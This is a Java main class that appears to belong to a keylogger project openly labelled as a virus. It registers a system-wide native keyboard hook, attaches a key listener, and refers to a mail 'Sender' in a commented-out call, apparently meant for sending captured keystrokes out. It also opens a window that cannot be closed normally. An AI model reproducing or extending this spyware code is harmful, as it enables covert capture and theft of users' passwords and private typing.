package main;

import javax.swing.JFrame;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import handlers.ManageService;
import handlers.Sender;

public class Main {

	
	public static void main(String[] args) {
		
	
		ManageService service = new ManageService();
		System.out.println("Test");
	
			try {
				// Sender.sendMail("Wassup?");
				GlobalScreen.registerNativeHook();
			} catch (NativeHookException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
	
		
		GlobalScreen.getInstance().addNativeKeyListener(service.getkeyboard());
		JFrame jf1 = new JFrame();
		jf1.setSize(720, 480);
		jf1.setTitle("Virus");
		jf1.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		jf1.setLayout(null);
		jf1.setResizable(false);
		jf1.setLocationRelativeTo(null);
		jf1.requestFocus();
		
		jf1.setVisible(true);
		
	}

}
